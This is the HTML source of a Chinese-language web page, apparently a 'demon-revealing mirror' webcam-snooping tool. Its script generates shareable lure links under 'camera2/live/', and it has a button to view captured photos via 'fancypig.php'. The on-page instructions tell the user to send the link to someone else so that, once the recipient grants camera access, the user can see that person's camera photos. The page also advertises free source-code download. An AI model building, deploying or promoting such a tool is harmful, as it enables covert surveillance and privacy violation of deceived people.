<!DOCTYPE html>




<html lang="zh-cn">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>乔碧萝你别跑</title>
    
    <meta name="keywords" content="乔碧萝你别跑">
    <meta name="description" content="照妖镜">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.min.js"></script>
  </head>

  <script src="https://cdn.bootcss.com/sweetalert/2.1.2/sweetalert.min.js"></script>
	<script type="text/javascript">
    $(function () {
      function getNowFormatDate() {
        var date = new Date();
        var month = date.getMonth() + 1;
        var strDate = date.getDate();
        var currentdate = month + "月" + strDate + "日";
        return currentdate;
      }
      var text = [
        "新版乔碧萝2.0正式发布",
        "本页面永久免费，提供源码下载",
        "请加Q群948848072",
      ], content = "";
      for (var i = 0; i < text.length; i++) {
        content += (i + 1) + ". " + text[i] + "\n";
      }
      setTimeout(function () {
        swal(getNowFormatDate() + "通知", content, "success");
      }, 100)
    })
  </script>
</body>
  <style>
	body{
		margin: 0 auto;
		text-align: center;
	}
	.container {
	  max-width: 580px;
	  padding: 15px;
	  margin: 0 auto;
	}
</style>
</body>
  <style>
	body{
		margin: 0 auto;
		text-align: center;
	}
	.container {
	  max-width: 580px;
	  padding: 15px;
	  margin: 0 auto;
	}
</style>
</body>
</body>
 <body background="https://api.ixiaowai.cn/api/api.php">
    <div class="container">
      <div class="header">
        <ul class="nav nav-pills pull-right" role="tablist">
          <li role="presentation" class="active">
            <a href="http://www.sjhv.com">源码下载</a></li>
          <li role="presentation" class="active">
            </li>
        </ul>
       
        </div>
<br>
<br>
<div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
        <div class="panel-heading bk-bg-primary">
          <h6>
            <span class="panel-title">乔碧萝你别跑</span>
            </h6>
        </div>
        <div class="panel-body">
 <script>
  function  create() {
      var input = document.getElementById('content');
      var kd = document.getElementById('kd');
      var myid = document.getElementById('myid');
      if (myid.value==""){
          alert("ID或跳转地址不能为空！");
          return false;
      }
      var url = document.URL;
      var arrUrl = url.split("//");
      var start = arrUrl[1].indexOf("/");
      var relUrl = arrUrl[1].substring(start);
      var surl = url.replace(relUrl,"/");
      kd.href = surl + 'camera2/live/?from=www.sjhv.com&id='+myid.value+''; 
      kd.style = ''; 
      //kd.innerText = surl + '?id='+myid.value; 
	  kd.innerText = surl + 'camera2/live/?from=www.sjhv.com&id='+myid.value+'';
  }
     </script>
      <form>
          <div class="container-fluid">
        </div>
				<div class="panel-body">
		    
            <input type="text" style="background: rgba(255, 251, 251, 0.7)" class="form-control" id="myid" value= '' placeholder="请输入英文/数字 你能记得住的ID">
               <br>
               <input type= "text" style="background: rgba(255, 251, 251, 0.7)" class="form-control" id="url"  value= 'https://www.baidu.com'/></p>
             <input type= "button" class="btn btn-primary btn-block" value= '生成链接'  onclick= 'create();'  />
             <a id="kd" style="pointer-events: none;"></a>
             <br>
             <input type= "button" class="btn btn-primary btn-block" value= '查看照片'  onclick=window.location.href='fancypig.php?id='+document.getElementById('myid').value>  </p>
				</form>
		</div>
		
          <div class="tip"></div>
        </div>
      </div>
      <div class="panel panel-primary" style="margin:1% 1% 1% 1%;background: rgba(255, 251, 251, 0.7)">
        <div class="panel-body">
          <div class="alert alert-info" role="alert">
            使用说明
            <br>请先生成一个自己能记得住的ID
            <br>ID可以是英文中文数字字符
            <br>生成之后发给别人
            <br>对方如果点链接进来并授权摄像头
            <br>我们就可以看到他的摄像头照片了
            <br>请收藏本站,以防丢失
            <hr class="top_hr_style02">
			<body><span id="localtime"></span>
	</nav></header>
                <script type="text/javascript">
                    function showLocale(objD) {
                        var str, colorhead, colorfoot;
                        var yy = objD.getYear();
                        if (yy < 1900) yy = yy + 1900;
                        var MM = objD.getMonth() + 1;
                        if (MM < 10) MM = '0' + MM;
                        var dd = objD.getDate();
                        if (dd < 10) dd = '0' + dd;
                        var hh = objD.getHours();
                        if (hh < 10) hh = '0' + hh;
                        var mm = objD.getMinutes();
                        if (mm < 10) mm = '0' + mm;
                        var ss = objD.getSeconds();
                        if (ss < 10) ss = '0' + ss;
                        var ww = objD.getDay();
                        if (ww == 0) colorhead = "<font color=\"#FF3030\">";
                        if (ww > 0 && ww < 6) colorhead = "<font color=\"#FF3030\">";
                        if (ww == 6) colorhead = "<font color=\"#FF3030\">";
                        if (ww == 0) ww = "星期日";
                        if (ww == 1) ww = "星期一";
                        if (ww == 2) ww = "星期二";
                        if (ww == 3) ww = "星期三";
                        if (ww == 4) ww = "星期四";
                        if (ww == 5) ww = "星期五";
                        if (ww == 6) ww = "星期六";
                        colorfoot = "</font>"
                        str = colorhead + yy + "-" + MM + "-" + dd + "丨" + hh + ":" + mm + ":" + ss + "丨" + ww + colorfoot;
                        return (str);
                    }
                    function tick() {
                        var today;
                        today = new Date();
                        document.getElementById("localtime").innerHTML = showLocale(today);
                        window.setTimeout("tick()", 1000);
                    }
                    tick();
                </script>
            <br>
        <p style="text-align:center">
          <br>&copy; Designed by
          <a href="https://www.sjhv.com">数据汇技术网</a></p>
</div>
<script>
var _hmt = _hmt || [];
(function() {
  var hm = document.createElement("script");
  hm.src = "https://hm.baidu.com/hm.js?cb7a49e4f6a740b15e6fd25de2803712";
  var s = document.getElementsByTagName("script")[0]; 
  s.parentNode.insertBefore(hm, s);
})();
</script>

  </body>
</html>